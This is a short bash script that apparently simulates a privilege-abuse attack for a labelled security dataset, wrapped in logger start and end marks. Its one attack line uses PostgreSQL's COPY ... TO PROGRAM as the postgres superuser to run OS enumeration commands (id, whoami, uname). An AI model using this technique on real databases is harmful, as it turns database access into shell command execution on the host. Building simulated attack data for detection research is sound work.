#!/bin/bash
echo "Simulating Privilege Abuse Attack (enum_system)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_enum_system" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'id; whoami; uname -a > /tmp/out_enum_system.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_enum_system" end
